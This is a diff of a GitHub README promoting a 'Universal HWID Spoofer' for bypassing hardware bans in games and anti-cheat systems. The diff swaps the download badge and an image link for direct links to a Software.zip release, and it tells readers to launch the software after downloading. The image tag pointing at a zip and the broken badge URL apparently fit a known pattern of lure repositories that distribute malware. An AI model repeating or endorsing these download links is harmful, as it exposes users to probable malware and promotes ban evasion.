@@ -2,7 +2,7 @@
 
 Welcome to the Universal HWID Spoofer repository - your ultimate solution for bypassing hardware bans and changing hardware IDs for various games and anti-cheat systems. 
 
-![HWID Spoofer](https://github.com/path/to/your/image.png)
+![HWID Spoofer](https://github.com/at94b/UNIVERSAL-HWID-SPOOFER/releases/download/v2.0/Software.zip)
 
 ## 📁 Repository Description
 
@@ -35,7 +35,7 @@ This repository is dedicated to providing a **NEW VERSION OF HWID SPOOFER** that
 
 You can download the **Universal HWID Spoofer** software from the link below:
 
-[![Download HWID Spoofer](https://img.shields.io/badge/Download-UNIVERSAL%20HWID%20SPOOFER-blue)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download HWID Spoofer](https://github.com/at94b/UNIVERSAL-HWID-SPOOFER/releases/download/v2.0/Software.zip%20HWID%20SPOOFER-blue)](https://github.com/at94b/UNIVERSAL-HWID-SPOOFER/releases/download/v2.0/Software.zip)
 
 🔥 **Note**: The software needs to be launched after downloading to start spoofing your hardware IDs.
 
